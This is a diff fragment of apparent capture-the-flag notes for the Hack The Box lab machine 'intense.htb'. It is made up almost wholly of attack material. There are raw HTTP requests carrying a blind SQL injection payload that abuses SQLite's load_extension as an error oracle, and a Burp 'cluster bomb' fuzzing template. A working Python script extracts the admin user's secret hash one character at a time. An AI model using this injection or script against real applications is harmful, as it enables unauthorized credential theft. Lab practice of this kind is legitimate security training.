@@ -46,3 +46,58 @@ Cookie: auth=dXNlcm5hbWU9Z3Vlc3Q7c2VjcmV0PTg0OTgzYzYwZjdkYWFkYzFjYjg2OTg2MjFmODA
 message=%22'%7C%7C(SELECT+CASE+WHEN+SUBSTR(secret%2C1%2C1)%3D'f'+THEN+1+ELSE+load_extension(''%2C'')+END+FROM+users+WHERE+role%3D1)%7C%7C'%22
 
 +++++++++++++++++++++++++++++++++++
++++++++++++++++++++++++++++++++++++
+
+
+CLUSTER BOMB
+
+
+POST /submitmessage HTTP/1.1
+Host: intense.htb
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://intense.htb/submit
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Content-Length: 153
+Connection: close
+Cookie: auth=dXNlcm5hbWU9Z3Vlc3Q7c2VjcmV0PTg0OTgzYzYwZjdkYWFkYzFjYjg2OTg2MjFmODAyYzBkOWY5YTNjM2MyOTVjODEwNzQ4ZmIwNDgxMTVjMTg2ZWM7.aQhtdDUMrtBmT9C8mhywLR/w/egUWK803DCorwQufB4=
+
+message=message=%22'%7C%7C(SELECT+CASE+WHEN+SUBSTR(username%2C§1§%2C1)%3D'§a§'+THEN+1+ELSE+load_extension(''%2C'')+END+FROM+users+WHERE+role%3D1)%7C%7C'%22
+
++++++++++++++++++++++++++++++++++++
++++++++++++++++++++++++++++++++++++
+
+
+#!/usr/bin/python3
+##
+##
+##
+##
+################################
+###################
+
+import requests
+
+s = requests.Session()
+URL = 'http://10.10.10.195'
+r = s.post(URL + '/postlogin', data={'username':'guest', 'password':'guest'})
+
+o, chars = '', '0123456789abcdef'
+for n in range(1, 255):
+        found = False
+        for c in chars:
+                msg = "'||(SELECT CASE WHEN SUBSTR(secret,{0},1)='{1}' THEN 1 ELSE load_extension('','') END FROM users WHERE role=1)||'".format(n, c)
+                r = s.post(URL + '/submitmessage', data={'message':msg})
+                if r.text == 'OK':
+                        found = True
+                        o += c
+                        break
+        if not found:
+                break
+print(o)
+
++++++++++++++++++++++++++++++++++++
++++++++++++++++++++++++++++++++++++
